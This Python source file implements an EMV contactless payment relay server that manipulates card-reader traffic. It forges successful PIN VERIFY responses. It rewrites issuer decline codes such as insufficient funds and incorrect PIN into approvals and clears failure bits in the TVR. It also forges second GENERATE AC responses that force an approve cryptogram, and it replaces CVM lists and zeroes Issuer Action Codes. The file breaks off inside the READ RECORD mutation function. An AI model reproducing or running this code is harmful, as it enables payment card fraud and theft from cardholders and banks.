# -*- coding: utf-8 -*-
#!/usr/bin/env python3



from __future__ import annotations


import os


import socket


import struct


import logging


import json


import time


from collections import deque


from dataclasses import dataclass, field


from logging.handlers import RotatingFileHandler


from typing import Optional, Tuple, Callable, Dict, List


from threading import Lock
import re


try:


    from protocol import CommandAPDU, ResponseAPDU, craft_verify_success


    _HAS_PROTOCOL = True


except ImportError:


    _HAS_PROTOCOL = False


try:


    import packet_router


except ImportError:


    packet_router = None



LOG_FILE = os.environ.get("RELAY_LOG_FILE", "relay.log")


LOG_LEVEL = os.environ.get("RELAY_LOG_LEVEL", "INFO").upper()


APDU_HISTORY_SIZE = 300


log = logging.getLogger("RelayServer")


log.setLevel(logging.DEBUG)


log.propagate = False


_fmt = logging.Formatter(


    "%(asctime)s.%(msecs)03d [%(levelname)s] %(message)s",


    datefmt="%H:%M:%S",


)


_stdout = logging.StreamHandler()


_stdout.setFormatter(_fmt)


_stdout.setLevel(getattr(logging, LOG_LEVEL, logging.INFO))


log.addHandler(_stdout)


try:


    _file = RotatingFileHandler(LOG_FILE, maxBytes=5 * 1024 * 1024, backupCount=5)


    _file.setFormatter(_fmt)


    _file.setLevel(logging.DEBUG)


    log.addHandler(_file)


    log.info(f"File logging enabled: {LOG_FILE}")


except OSError as e:


    log.warning(f"Could not open log file {LOG_FILE}: {e} - stdout only")


if not _HAS_PROTOCOL:


    log.warning("protocol.py not found - using raw byte inspection fallback.")


if packet_router is None:


    log.warning("packet_router.py not found - MITM/Profile features disabled.")


_apdu_history: deque = deque(maxlen=APDU_HISTORY_SIZE)


_apdu_history_lock = Lock()


def _record_apdu(direction: str, kind: str, ins_name: str,


                 payload: bytes, note: str = "") -> None:


    hex_str = payload.hex().upper()


    entry = {


        "ts": round(time.time(), 3),


        "direction": direction, "kind": kind, "ins": ins_name,


        "hex": hex_str, "len": len(payload), "note": note,


    }


    with _apdu_history_lock:


        _apdu_history.append(entry)


    suffix = f" [{note}]" if note else ""


    log.debug(f"APDU {direction} {kind} {ins_name} len={len(payload)}: {hex_str}{suffix}")



SID_REGISTER = 0x00


SID_CAPDU = 0x04


SID_RAPDU = 0x05


SID_ACK = 0x05


SID_HEARTBEAT = 0x06


SID_CTRL = 0x0F


APDU_CLA, APDU_INS, APDU_P1, APDU_P2 = 0, 1, 2, 3


VERIFY_CLA, VERIFY_INS, VERIFY_P1, VERIFY_P2 = 0x00, 0x20, 0x00, 0x80


INS_SELECT = 0xA4


INS_GET_PROCESSING_OPTIONS = 0xA8


INS_READ_RECORD = 0xB2


INS_VERIFY = 0x20


INS_GENERATE_AC = 0xAE


INS_GET_DATA = 0xCA


INS_EXTERNAL_AUTHENTICATE = 0x82


INS_MAP = {


    INS_SELECT: "SELECT",


    INS_GET_PROCESSING_OPTIONS: "GET PROCESSING OPTIONS",


    INS_READ_RECORD: "READ RECORD",


    INS_GENERATE_AC: "GENERATE AC",


    INS_GET_DATA: "GET DATA",


    INS_VERIFY: "VERIFY",


    INS_EXTERNAL_AUTHENTICATE: "EXTERNAL AUTHENTICATE",


}


TEMPLATE_77 = 0x77


TEMPLATE_80 = 0x80


CID_AAC = 0x00


CID_TC = 0x40


CID_ARQC = 0x80


CID_NAME_MAP = {


    CID_AAC: "AAC(decline)",


    CID_TC: "TC(approve)",


    CID_ARQC: "ARQC(online)",


}


# ARC codes we rewrite (Issuer decline -> Approved)


ARC_REWRITE_MAP = {


    b"05": b"00",  # Do not honor


    b"51": b"00",  # Insufficient funds


    b"54": b"00",  # Expired card


    b"55": b"00",  # Incorrect PIN


    b"61": b"00",  # Exceeds withdrawal limit


    b"65": b"00",  # Exceeds withdrawal frequency


    b"91": b"00",  # Issuer unavailable


}


SW_9000 = b"\x90\x00"


SW_6F00 = b"\x6F\x00"


PEER_TIMEOUT_SECONDS = 45.0


SOCKET_TIMEOUT = 1.0


RECV_BUFFER = 4096


STALL_WARN_SECONDS = 3.0



BRAND_UNKNOWN = "UNKNOWN"


BRAND_VISA = "VISA"


BRAND_MASTERCARD = "MASTERCARD"


BRAND_AMEX = "AMEX"


BRAND_DISCOVER = "DISCOVER"


BRAND_JCB = "JCB"


BRAND_UNIONPAY = "UNIONPAY"


AID_BRAND_MAP: List[Tuple[bytes, str]] = [


    (bytes.fromhex("A000000003"), BRAND_VISA),


    (bytes.fromhex("A000000098"), BRAND_VISA),


    (bytes.fromhex("A000000004"), BRAND_MASTERCARD),


    (bytes.fromhex("A000000005"), BRAND_MASTERCARD),


    (bytes.fromhex("A000000025"), BRAND_AMEX),


    (bytes.fromhex("A000000152"), BRAND_DISCOVER),


    (bytes.fromhex("A000000324"), BRAND_DISCOVER),


    (bytes.fromhex("A000000065"), BRAND_JCB),


    (bytes.fromhex("A000000333"), BRAND_UNIONPAY),


]


BRAND_IAD_TEMPLATES: Dict[str, bytes] = {


    BRAND_VISA:       bytes.fromhex("06010A03A00000A5000000"),


    BRAND_MASTERCARD: bytes.fromhex("0F0A01A50000000000000000"),


    BRAND_AMEX:       bytes.fromhex("06020000000000"),


    BRAND_DISCOVER:   bytes.fromhex("06010A03A00000A5000000"),


    BRAND_JCB:        bytes.fromhex("06010A03A00000A5000000"),


    BRAND_UNIONPAY:   bytes.fromhex("06010A03A00000A5000000"),


    BRAND_UNKNOWN:    bytes.fromhex("0F0A01A50000000000000000"),


}


def identify_brand_from_aid(aid: bytes) -> str:


    for prefix, brand in AID_BRAND_MAP:


        if aid.startswith(prefix):


            return brand


    return BRAND_UNKNOWN


def brand_iad_default(brand: str) -> bytes:


    return BRAND_IAD_TEMPLATES.get(brand, BRAND_IAD_TEMPLATES[BRAND_UNKNOWN])


def extract_aid_from_select(capdu: bytes) -> Optional[bytes]:


    if len(capdu) < 6:


        return None


    if capdu[APDU_INS] != INS_SELECT:


        return None


    if capdu[APDU_P1] != 0x04:


        return None


    lc = capdu[4]


    if lc == 0 or 5 + lc > len(capdu):


        return None


    return capdu[5:5 + lc]


_PPSE_NAME = b"2PAY.SYS.DDF01"


_PSE_NAME = b"1PAY.SYS.DDF01"


def is_ppse_or_pse(aid: bytes) -> bool:


    return aid == _PPSE_NAME or aid == _PSE_NAME




def build_frame(sid: int, payload: bytes) -> bytes:


    total = len(payload) + 1


    return struct.pack(">I", total) + bytes([sid]) + payload


def parse_frame(data: bytes) -> Optional[Tuple[int, bytes]]:


    if len(data) < 5:


        return None


    declared = struct.unpack(">I", data[:4])[0]


    if declared != len(data) - 4:


        return None


    return data[4], data[5:]




def is_verify_apdu(apdu: bytes) -> bool:


    return (len(apdu) >= 4


            and apdu[APDU_CLA] == VERIFY_CLA


            and apdu[APDU_INS] == VERIFY_INS


            and apdu[APDU_P1] == VERIFY_P1


            and apdu[APDU_P2] == VERIFY_P2)


def is_generate_ac(apdu: bytes) -> bool:


    return len(apdu) >= 2 and apdu[APDU_INS] == INS_GENERATE_AC


def is_gpo(apdu: bytes) -> bool:


    return len(apdu) >= 2 and apdu[APDU_INS] == INS_GET_PROCESSING_OPTIONS


def is_select(apdu: bytes) -> bool:


    return len(apdu) >= 2 and apdu[APDU_INS] == INS_SELECT


def is_external_auth(apdu: bytes) -> bool:


    return len(apdu) >= 2 and apdu[APDU_INS] == INS_EXTERNAL_AUTHENTICATE


def gac_p1(apdu: bytes) -> Optional[int]:


    return apdu[APDU_P1] if len(apdu) >= 3 else None


def gac_p1_name(p1: Optional[int]) -> str:



    if p1 is None:


        return "?"


    cryptogram_type = p1 & 0xC0


    if cryptogram_type == 0x00:


        return f"AAC-req(P1=0x{p1:02X})"


    if cryptogram_type == 0x40:


        return f"TC-req(P1=0x{p1:02X})"


    if cryptogram_type == 0x80:


        return f"ARQC-req(P1=0x{p1:02X})"


    return f"?(P1=0x{p1:02X})"




def find_tlv(data: bytes, target_tag: int) -> Optional[bytes]:


    i = 0


    n = len(data)


    while i < n:


        tag_first = data[i]


        i += 1


        if (tag_first & 0x1F) == 0x1F:


            if i >= n:


                return None


            tag = (tag_first << 8) | data[i]


            i += 1


        else:


            tag = tag_first


        if i >= n:


            return None


        length_first = data[i]


        i += 1


        if length_first & 0x80:


            num_bytes = length_first & 0x7F


            if num_bytes == 0 or num_bytes > 2 or i + num_bytes > n:


                return None


            length = 0


            for _ in range(num_bytes):


                length = (length << 8) | data[i]


                i += 1


        else:


            length = length_first


        if i + length > n:


            return None


        value = data[i:i + length]


        if tag == target_tag:


            return value


        if tag_first & 0x20:  # constructed - descend


            inner = find_tlv(value, target_tag)


            if inner is not None:


                return inner


        i += length


    return None


def build_tlv(tag: int, value: bytes) -> bytes:


    if tag > 0xFF:


        tag_bytes = struct.pack(">H", tag)


    else:


        tag_bytes = bytes([tag])


    length = len(value)


    if length < 0x80:


        length_bytes = bytes([length])


    elif length < 0x100:


        length_bytes = bytes([0x81, length])


    else:


        length_bytes = bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])


    return tag_bytes + length_bytes + value




def detect_gpo_template(rapdu: bytes) -> Optional[int]:


    if len(rapdu) < 3:


        return None


    body = rapdu[:-2]


    if not body:


        return None


    first = body[0]


    if first == TEMPLATE_77:


        return TEMPLATE_77


    if first == TEMPLATE_80:


        return TEMPLATE_80


    return None




@dataclass


class ArqcCache:


    template: Optional[int] = None


    cid: Optional[int] = None


    atc: Optional[bytes] = None


    ac: Optional[bytes] = None


    iad: Optional[bytes] = None
    
    sdad: Optional[bytes] = None 


    parse_notes: List[str] = field(default_factory=list)


    def is_complete(self) -> bool:


        return all([self.cid is not None, self.atc, self.ac, self.iad])


    def clear(self) -> None:


        self.template = None


        self.cid = None


        self.atc = None


        self.ac = None


        self.iad = None


        self.parse_notes.clear()


def extract_arqc_from_rapdu(rapdu: bytes, gpo_template: Optional[int]) -> ArqcCache:


    cache = ArqcCache()


    if len(rapdu) < 3:


        cache.parse_notes.append("FAIL: rapdu < 3 bytes")


        return cache


    body = rapdu[:-2]


    sw = rapdu[-2:]


    cache.parse_notes.append(f"SW={sw.hex().upper()}")


    if not body:


        cache.parse_notes.append("FAIL: body empty after SW strip")


        return cache


    first = body[0]


    cache.parse_notes.append(f"first_byte=0x{first:02X}")


    if first == TEMPLATE_77:


        cache.template = TEMPLATE_77


        cache.parse_notes.append("template=77 (BER-TLV)")


        cid_val = find_tlv(body, 0x9F27)


        atc_val = find_tlv(body, 0x9F36)


        ac_val = find_tlv(body, 0x9F26)


        iad_val = find_tlv(body, 0x9F10)


        if cid_val is None:


            cache.parse_notes.append("MISS: 9F27 (CID) not found in template 77")


        elif len(cid_val) < 1:


            cache.parse_notes.append("MISS: 9F27 value empty")


        else:


            cache.cid = cid_val[0]


            cid_name = CID_NAME_MAP.get(cache.cid, f"UNKNOWN(0x{cache.cid:02X})")


            cache.parse_notes.append(f"OK: CID=0x{cache.cid:02X} {cid_name}")


        if atc_val:


            cache.atc = atc_val


            cache.parse_notes.append(f"OK: ATC={atc_val.hex().upper()}")


        else:


            cache.parse_notes.append("MISS: 9F36 (ATC) not found")


        if ac_val:


            cache.ac = ac_val


            cache.parse_notes.append(f"OK: AC={ac_val.hex().upper()}")


        else:


            cache.parse_notes.append("MISS: 9F26 (AC) not found")


        if iad_val:


            cache.iad = iad_val


            cache.parse_notes.append(f"OK: IAD={iad_val.hex().upper()}")


        else:


            cache.parse_notes.append("MISS: 9F10 (IAD) not found")


    elif first == TEMPLATE_80:


        cache.template = TEMPLATE_80


        cache.parse_notes.append("template=80 (fixed format)")


        if len(body) < 2:


            cache.parse_notes.append("FAIL: template 80 body < 2 bytes")


            return cache


        length = body[1]


        payload = body[2:2 + length]


        cache.parse_notes.append(f"declared_len={length} actual={len(payload)}")


        if len(payload) < 11:


            cache.parse_notes.append(f"FAIL: payload {len(payload)} < 11 (need CID+ATC+AC min)")


            return cache


        cache.cid = payload[0]


        cid_name = CID_NAME_MAP.get(cache.cid, f"UNKNOWN(0x{cache.cid:02X})")


        cache.parse_notes.append(f"OK: CID=0x{cache.cid:02X} {cid_name}")


        cache.atc = payload[1:3]


        cache.parse_notes.append(f"OK: ATC={cache.atc.hex().upper()}")


        cache.ac = payload[3:11]


        cache.parse_notes.append(f"OK: AC={cache.ac.hex().upper()}")


        cache.iad = payload[11:] if len(payload) > 11 else b""


        cache.parse_notes.append(


            f"OK: IAD={cache.iad.hex().upper()}" if cache.iad


            else "WARN: IAD empty (payload had no bytes after AC)"


        )


    else:


        cache.parse_notes.append(f"FAIL: unrecognized template 0x{first:02X}")


        if gpo_template in (TEMPLATE_77, TEMPLATE_80):


            cache.template = gpo_template


            cache.parse_notes.append(f"FALLBACK: inheriting GPO template 0x{gpo_template:02X}")


    return cache


def cid_indicates_arqc(cache: ArqcCache, rapdu: bytes) -> Tuple[bool, str]:




    if cache.cid is not None:


        if cache.cid == CID_ARQC:


            return True, "CID=0x80 ARQC parsed cleanly"


        if cache.cid == CID_TC:


            return False, "CID=0x40 TC (card offline-approved, no 2nd GAC expected)"


        if cache.cid == CID_AAC:


            return False, "CID=0x00 AAC (card offline-declined, no 2nd GAC will follow)"


        return False, f"CID=0x{cache.cid:02X} unrecognized (not ARQC)"




    if b"\x9F\x27\x01\x80" in rapdu:


        return True, "byte-scan fallback matched 9F 27 01 80"


    if b"\x9F\x27\x01\x40" in rapdu:


        return False, "byte-scan fallback matched 9F 27 01 40 (TC)"


    if b"\x9F\x27\x01\x00" in rapdu:


        return False, "byte-scan fallback matched 9F 27 01 00 (AAC)"


    return False, "CID unparseable AND no byte-scan hit - state machine cannot arm 2nd GAC forge"



def rewrite_arpc_in_capdu(capdu: bytes) -> Tuple[bytes, Optional[str]]:




    if len(capdu) < 5:


        return capdu, None


    ins = capdu[APDU_INS]


    if ins not in (INS_EXTERNAL_AUTHENTICATE, INS_GENERATE_AC):


        return capdu, None


    lc = capdu[4]


    if lc == 0 or 5 + lc > len(capdu):


        return capdu, None


    header = capdu[:5]


    data = bytearray(capdu[5:5 + lc])


    tail = capdu[5 + lc:]


    rewritten = False


    old_val_hex = ""


    new_val_hex = ""


    offset_found = -1


    for decline_code, approve_code in ARC_REWRITE_MAP.items():


        offset = data.find(decline_code)


        if offset >= 0:


            old_val_hex = bytes(data[offset:offset + 2]).hex().upper()


            new_val_hex = bytes(approve_code).hex().upper()


            data[offset:offset + 2] = approve_code


            offset_found = offset


            rewritten = True


            break


    if not rewritten:


        return capdu, None


    result = header + bytes(data) + tail


    ins_name = INS_MAP.get(ins, f"0x{ins:02X}")


    note = f"ARC {old_val_hex}->{new_val_hex} at offset {offset_found} in {ins_name}"


    log.info(f"[ARPC-REWRITE] {note}")


    return result, note



def mutate_tvr_in_generate_ac(capdu: bytes) -> Tuple[bytes, Optional[str]]:



    if len(capdu) < 5 or capdu[APDU_INS] != INS_GENERATE_AC:


        return capdu, None


    lc = capdu[4]


    if lc == 0 or 5 + lc > len(capdu):


        return capdu, None


    header = capdu[:5]


    data = bytearray(capdu[5:5 + lc])


    tail = capdu[5 + lc:]


    # Tag 95 (TVR) is always 5 bytes. Look for 95 05.


    offset = -1


    for i in range(len(data) - 6):


        if data[i] == 0x95 and data[i+1] == 0x05:


            offset = i + 2


            break


    if offset < 0:


        return capdu, None


    original_tvr = bytes(data[offset:offset+5])


    tvr = bytearray(original_tvr)


    # Byte 1: Clear ODA failure (bit 8)


    tvr[0] &= ~0x80


    # Byte 3: Clear CVM failure (bit 8) and Online PIN entered (bit 7)


    tvr[2] &= ~0x80


    tvr[2] &= ~0x40


    data[offset:offset+5] = tvr


    result = header + bytes(data) + tail


    note = f"TVR mutated {original_tvr.hex().upper()} -> {bytes(tvr).hex().upper()}"


    log.info(f"[TVR-MUTATE] {note}")


    return result, note


def forge_2nd_gac_template_77(


    cache: ArqcCache,


    forced_cid: int = CID_TC,


    brand: str = BRAND_UNKNOWN,


) -> bytes:


    cid = bytes([forced_cid])


    atc = cache.atc or b"\x00\x01"


    ac = cache.ac or b"\x41\x41\x41\x41\x41\x41\x41\x41"


    iad = cache.iad or brand_iad_default(brand)


    inner = (


        build_tlv(0x9F27, cid)


        + build_tlv(0x9F36, atc)


        + build_tlv(0x9F26, ac)


        + build_tlv(0x9F10, iad)

    )


    template = build_tlv(TEMPLATE_77, inner)


    return template + SW_9000


def forge_2nd_gac_template_80(


    cache: ArqcCache,


    forced_cid: int = CID_TC,


    brand: str = BRAND_UNKNOWN,


) -> bytes:


    cid = bytes([forced_cid])


    atc = cache.atc or b"\x00\x01"


    ac = cache.ac or b"\x41\x41\x41\x41\x41\x41\x41\x41"


    iad = cache.iad or brand_iad_default(brand)


    payload = cid + atc + ac + iad


    if len(payload) > 0xFF:


        length_bytes = bytes([0x81, len(payload)])


    else:


        length_bytes = bytes([len(payload)])


    return bytes([TEMPLATE_80]) + length_bytes + payload + SW_9000


FORGE_DISPATCH: Dict[int, Callable[[ArqcCache, int, str], bytes]] = {


    TEMPLATE_77: forge_2nd_gac_template_77,


    TEMPLATE_80: forge_2nd_gac_template_80,


}


def forge_2nd_gac(


    cache: ArqcCache,


    forced_cid: int = CID_TC,


    brand: str = BRAND_UNKNOWN,


) -> Optional[bytes]:


    template = cache.template


    if template is None:


        return None


    forger = FORGE_DISPATCH.get(template)


    if forger is None:


        return None


    return forger(cache, forced_cid, brand)




def craft_verify_success_bytes() -> bytes:


    if _HAS_PROTOCOL:


        try:


            resp = craft_verify_success()


            if hasattr(resp, "to_bytes"):


                return resp.to_bytes()


            if hasattr(resp, "__bytes__"):


                return bytes(resp)


            if hasattr(resp, "raw"):


                return resp.raw


        except Exception as e:


            log.debug(f"craft_verify_success helper failed: {e} - using raw 9000")


    return SW_9000

def fix_gac_response_length(payload: bytes) -> Tuple[bytes, Optional[str]]:

    if len(payload) < 4:
        return payload, None

    body = payload[:-2]
    sw = payload[-2:]
    if not body:
        return payload, None

    first = body[0]
    if first not in (TEMPLATE_77, TEMPLATE_80):
        return payload, None

    if len(body) < 2:
        return payload, None

    length_first = body[1]
    if length_first < 0x80:
        declared_len = length_first
        header_size = 2
    elif length_first == 0x81:
        if len(body) < 3:
            return payload, None
        declared_len = body[2]
        header_size = 3
    elif length_first == 0x82:
        if len(body) < 4:
            return payload, None
        declared_len = (body[2] << 8) | body[3]
        header_size = 4
    else:
        return payload, None

    actual_len = len(body) - header_size
    if actual_len == declared_len:
        return payload, None

    inner = body[header_size:]
    tag = bytes([first])

    if actual_len < 0x80:
        new_length_bytes = bytes([actual_len])
    elif actual_len < 0x100:
        new_length_bytes = bytes([0x81, actual_len])
    else:
        new_length_bytes = bytes([0x82, (actual_len >> 8) & 0xFF, actual_len & 0xFF])

    fixed = tag + new_length_bytes + inner + sw
    note = (
        f"template=0x{first:02X} declared_len={declared_len} "
        f"actual_len={actual_len} -> length byte rewritten"
    )
    return fixed, note



@dataclass
class SessionState:
    seq: int = 0
    gpo_template: Optional[int] = None
    arqc_cache: ArqcCache = field(default_factory=ArqcCache)
    pending_capdu: Optional[bytes] = None
    second_ae_pending: bool = False
    second_ae_reason: str = ""
    card_present: bool = False
    verify_bypass_enabled: bool = True
    arpc_forge_enabled: bool = True
    arpc_rewrite_enabled: bool = True
    tvr_mutation_enabled: bool = True
    verify_bypass_count: int = 0
    arpc_forge_count: int = 0
    arpc_rewrite_count: int = 0
    tvr_mutation_count: int = 0
    gac_response_count: int = 0
    brand: str = BRAND_UNKNOWN
    selected_aid: Optional[bytes] = None

    def reset(self) -> None:
        self.seq += 1
        self.gpo_template = None
        self.arqc_cache.clear()
        self.pending_capdu = None
        self.second_ae_pending = False
        self.second_ae_reason = ""
        self.card_present = False
        self.verify_bypass_count = 0
        self.arpc_forge_count = 0
        self.arpc_rewrite_count = 0
        self.tvr_mutation_count = 0
        self.gac_response_count = 0
        self.brand = BRAND_UNKNOWN
        self.selected_aid = None

class RelayServer:

    def __init__(self, host: str = "0.0.0.0", port: int = 5566):

        self.host = host

        self.port = port

        self.sock: Optional[socket.socket] = None

        self.running = False


        self.reader_addr: Optional[Tuple[str, int]] = None

        self.emulator_addr: Optional[Tuple[str, int]] = None

        self.reader_last_seen: float = 0.0

        self.emulator_last_seen: float = 0.0


        self.state = SessionState()

        self.lock = Lock()


    def start(self) -> None:

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.sock.bind((self.host, self.port))

        self.sock.settimeout(SOCKET_TIMEOUT)

        self.running = True


        if packet_router:

            packet_router._sock = self.sock


        log.info(f"RelayServer listening on {self.host}:{self.port}")

        log.info(f"VERIFY bypass:  {'ENABLED' if self.state.verify_bypass_enabled else 'DISABLED'}")

        log.info(f"ARPC forge:     {'ENABLED' if self.state.arpc_forge_enabled else 'DISABLED'}")

        log.info(f"ARPC rewrite:   {'ENABLED' if self.state.arpc_rewrite_enabled else 'DISABLED'}")

        log.info(f"TVR mutation:   {'ENABLED' if self.state.tvr_mutation_enabled else 'DISABLED'}")

        log.info(f"protocol.py:    {'loaded' if _HAS_PROTOCOL else 'fallback (raw bytes)'}")

        log.info(f"packet_router:  {'loaded' if packet_router else 'disabled'}")

        self._run_loop()


    def stop(self) -> None:

        self.running = False

        if self.sock:

            self.sock.close()

        log.info("RelayServer stopped")


    def _run_loop(self) -> None:

        last_activity = time.time()

        stall_warned = False

        while self.running:

            try:

                data, addr = self.sock.recvfrom(RECV_BUFFER)

                last_activity = time.time()

                stall_warned = False

                self._handle_packet(data, addr)

            except socket.timeout:

                if self.state.selected_aid is not None:

                    elapsed = time.time() - last_activity

                    if elapsed > STALL_WARN_SECONDS and not stall_warned:

                        log.warning(

                            f"[STALL] No APDU activity for {elapsed:.1f}s "

                            f"(brand={self.state.brand}, "

                            f"second_ae_pending={self.state.second_ae_pending}, "

                            f"reason={self.state.second_ae_reason})"

                        )

                        stall_warned = True

                self._check_peer_timeouts()

                continue

            except OSError:

                if self.running:

                    log.error("Socket error")

                break


    def _check_peer_timeouts(self) -> None:

        now = time.time()

        if self.reader_addr and (now - self.reader_last_seen) > PEER_TIMEOUT_SECONDS:

            log.warning(f"Reader {self.reader_addr} timed out")

            self.reader_addr = None

        if self.emulator_addr and (now - self.emulator_last_seen) > PEER_TIMEOUT_SECONDS:

            log.warning(f"Emulator {self.emulator_addr} timed out")

            self.emulator_addr = None


    def _touch_peer(self, addr: Tuple[str, int]) -> None:

        now = time.time()

        if addr == self.reader_addr:

            self.reader_last_seen = now

        elif addr == self.emulator_addr:

            self.emulator_last_seen = now


    def _send_frame(self, addr: Tuple[str, int], sid: int, payload: bytes) -> None:

        frame = build_frame(sid, payload)

        try:

            self.sock.sendto(frame, addr)

        except OSError as e:

            log.warning(f"Send to {addr} failed: {e}")


    def _send_ack(self, addr: Tuple[str, int]) -> None:

        self._send_frame(addr, SID_ACK, b"")


    def _send_ctrl_response(self, addr: Tuple[str, int], text: str) -> None:

        self._send_frame(addr, SID_CTRL, text.encode("utf-8"))


    def _handle_packet(self, data: bytes, addr: Tuple[str, int]) -> None:

        parsed = parse_frame(data)

        if parsed is None:

            log.debug(f"Malformed frame from {addr}: {data[:16].hex()}...")

            return


        sid, payload = parsed

        self._touch_peer(addr)


        handlers = {

            SID_REGISTER:  self._handle_register,

            SID_CAPDU:     self._handle_capdu,

            SID_RAPDU:     self._handle_rapdu,

            SID_HEARTBEAT: self._handle_heartbeat,

            SID_CTRL:      self._handle_ctrl,

        }

        handler = handlers.get(sid)

        if handler is None:

            log.debug(f"Unhandled SID 0x{sid:02X} from {addr}")

            return

        handler(payload, addr)


    def _handle_register(self, payload: bytes, addr: Tuple[str, int]) -> None:

        mode = payload.decode("utf-8", errors="replace").strip()

        log.info(f"REGISTER from {addr}: mode={mode}")


        if mode == "READER":

            self.reader_addr = addr

            self.reader_last_seen = time.time()

            self._send_ack(addr)

        elif mode == "EMULATOR":

            self.emulator_addr = addr

            self.emulator_last_seen = time.time()

            self._send_ack(addr)

        elif mode == "DEREGISTER":

            if addr == self.reader_addr:

                self.reader_addr = None

            if addr == self.emulator_addr:

                self.emulator_addr = None

            self._send_ack(addr)

        else:

            log.warning(f"Unknown REGISTER mode: {mode!r}")

            return


        if packet_router:

            packet_router._reader_addr = self.reader_addr

            packet_router._emulator_addr = self.emulator_addr


    def _identify_source(self, addr: Tuple[str, int]) -> Tuple[Optional[Tuple[str, int]], str, str]:

        if addr == self.emulator_addr:

            return self.reader_addr, "EMULATOR", "READER"

        if addr == self.reader_addr:

            return self.emulator_addr, "READER", "EMULATOR"

        return None, "?", "?"


    def _handle_capdu(self, payload: bytes, addr: Tuple[str, int]) -> None:

        target, source_name, target_name = self._identify_source(addr)

        if source_name == "?":

            log.warning(f"CAPDU from unknown address {addr}")

            return


        # VERIFY BYPASS

        if (source_name == "EMULATOR"

                and self.state.verify_bypass_enabled

                and is_verify_apdu(payload)):

            with self.lock:

                self.state.verify_bypass_count += 1

                count = self.state.verify_bypass_count

            pin_len = payload[4] if len(payload) > 4 else 0

            _record_apdu("EMU>RDR", "CAPDU", "VERIFY", payload,

                         note=f"INTERCEPTED (bypass #{count}, PIN Lc={pin_len})")

            log.info(f"[VERIFY-BYPASS #{count}] Intercepted VERIFY (Lc={pin_len}) -> 9000")

            fake_resp = craft_verify_success_bytes()

            _record_apdu("FORGE>EMU", "RAPDU", "VERIFY-FORGE", fake_resp,

                         note="forged 9000")

            self._send_frame(self.emulator_addr, SID_RAPDU, fake_resp)

            return


        if not target:

            log.warning(f"CAPDU from {source_name} dropped: {target_name} not registered")

            return


        # AID sniffer

        if source_name == "EMULATOR" and is_select(payload):

            aid = extract_aid_from_select(payload)

            if aid and not is_ppse_or_pse(aid):

                brand = identify_brand_from_aid(aid)

                with self.lock:

                    self.state.selected_aid = aid

                    self.state.brand = brand

                log.info(f"AID selected: {aid.hex().upper()} -> brand={brand}")


        # ARPC REWRITE

        if (source_name == "EMULATOR"

                and self.state.arpc_rewrite_enabled

                and (is_external_auth(payload) or is_generate_ac(payload))):

            try:

                rewritten, note = rewrite_arpc_in_capdu(payload)

                if note is not None:

                    with self.lock:

                        self.state.arpc_rewrite_count += 1

                        count = self.state.arpc_rewrite_count

                    _record_apdu("EMU>RDR", "CAPDU",

                                 INS_MAP.get(payload[APDU_INS], "?"),

                                 rewritten, note=f"REWRITE #{count}: {note}")

                    payload = rewritten

            except Exception as e:

                log.error(f"[ARPC-REWRITE CRASH] {type(e).__name__}: {e}", exc_info=True)


        # TVR MUTATION (GENERATE AC)

        if (source_name == "EMULATOR"

                and self.state.tvr_mutation_enabled

                and is_generate_ac(payload)):

            try:

                mutated, note = mutate_tvr_in_generate_ac(payload)

                if note is not None:

                    with self.lock:

                        self.state.tvr_mutation_count += 1

                        count = self.state.tvr_mutation_count

                    _record_apdu("EMU>RDR", "CAPDU", "GENERATE AC", mutated,

                                 note=f"TVR-MUTATE #{count}: {note}")

                    payload = mutated

            except Exception as e:

                log.error(f"[TVR-MUTATE CRASH] {type(e).__name__}: {e}", exc_info=True)


        # 2nd GAC FORGERY

        if (source_name == "EMULATOR"

                and self.state.arpc_forge_enabled

                and self.state.second_ae_pending

                and is_generate_ac(payload)):

            try:

                _record_apdu("EMU>RDR", "CAPDU", "GENERATE AC (2nd)", payload,

                             note=f"INTERCEPTED for forge (brand={self.state.brand})")

                self._handle_second_gac_forge(payload)

            except Exception as e:

                log.error(f"[ARPC-FORGE CRASH] {type(e).__name__}: {e}", exc_info=True)

                self._send_frame(self.emulator_addr, SID_RAPDU, SW_6F00)

                with self.lock:

                    self.state.second_ae_pending = False

                    self.state.second_ae_reason = f"forge crashed: {e}"

            return


        if packet_router and source_name == "EMULATOR":

            try:

                packet_router.classify_and_cache(payload)

            except Exception as e:

                log.debug(f"packet_router.classify_and_cache failed: {e}")


        if source_name == "EMULATOR":

            with self.lock:

                self.state.pending_capdu = payload


        self._send_frame(target, SID_CAPDU, payload)

        ins_byte = payload[APDU_INS] if len(payload) > APDU_INS else None

        ins_name = INS_MAP.get(ins_byte, f"0x{ins_byte:02X}" if ins_byte is not None else "??")

        _record_apdu(f"{source_name[:3]}>{target_name[:3]}", "CAPDU", ins_name, payload)

        log.info(f"CAPDU {ins_name} {source_name} > {target_name}")

    def _mutate_read_record_response(self, rapdu: bytes) -> bytes:

        if len(rapdu) < 3:
            return rapdu
        body = rapdu[:-2]
        sw = rapdu[-2:]
        if not body:
            return rapdu

        # Parse all TLV tags
        tags = []
        i = 0
        while i < len(body):
            tag_first = body[i]
            i += 1
            if (tag_first & 0x1F) == 0x1F:
                if i >= len(body):
                    break
                tag = (tag_first << 8) | body[i]
                i += 1
            else:
                tag = tag_first

            if i >= len(body):
                break
            length_first = body[i]
            i += 1
            if length_first & 0x80:
                num_bytes = length_first & 0x7F
                if num_bytes == 0 or num_bytes > 2 or i + num_bytes > len(body):
                    break
                length = 0
                for _ in range(num_bytes):
                    length = (length << 8) | body[i]
                    i += 1
            else:
                length = length_first

            if i + length > len(body):
                break
            value = body[i:i + length]
            tags.append((tag, value))
            i += length

        mutated = False
        
        for idx, (tag, value) in enumerate(tags):
            # CVM list mutation
            if tag == 0x8E:
                new_cvm = bytes.fromhex("000000000000000000001F031E030000")
                log.warning(f"[CVM-MUTATE] Tag 8E replaced. Original: {value.hex()} > New: {new_cvm.hex()}")
                tags[idx] = (tag, new_cvm)
                mutated = True
            
            # IAC mutation - zero out all three IAC tags
            elif tag in (0x9F0D, 0x9F0E, 0x9F0F):
                iac_name = {
                    0x9F0D: "IAC-Default",
                    0x9F0E: "IAC-Denial", 
                    0x9F0F: "IAC-Online"
                }.get(tag, "IAC")
                
                # Zero out the IAC - tells terminal "issuer approves everything offline"
                new_iac = b'\x00' * len(value)
                log.warning(f"[IAC-MUTATE] {iac_name} zeroed. Original: {value.hex()} > New: {new_iac.hex()}")
                tags[idx] = (tag, new_iac)
